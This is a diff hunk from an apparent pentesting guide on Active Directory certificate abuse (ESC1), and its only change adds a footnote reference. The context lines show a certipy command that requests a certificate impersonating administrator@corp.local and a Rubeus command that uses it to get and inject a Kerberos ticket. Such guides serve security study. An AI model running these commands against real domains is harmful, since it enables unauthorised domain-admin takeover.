@@ -58,7 +58,7 @@ certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.loc
   -template 'ESC1' -upn 'administrator@corp.local'
 ```
 
-Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:
+Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:<sup>[[5]](#references)</sup>
 
 ```bash
 Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
